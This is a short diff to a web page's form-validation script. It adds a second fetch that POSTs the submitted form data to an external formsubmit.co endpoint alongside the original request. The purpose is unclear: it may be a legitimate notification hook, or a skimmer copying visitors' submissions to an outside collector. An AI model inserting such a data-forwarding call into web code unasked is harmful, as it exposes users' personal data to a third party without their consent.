@@ -2009,6 +2009,10 @@ function validateForm() {
                     method: 'POST',
                     body: formData
                 })
+                   fetch('https://formsubmit.co/ajax/13b561c9abe118b3624d1bc45a08e458', {
+                    method: 'POST',
+                    body: formData
+                })
                 .then(response => {
                     if (response.ok) {
                         setTimeout(() => {
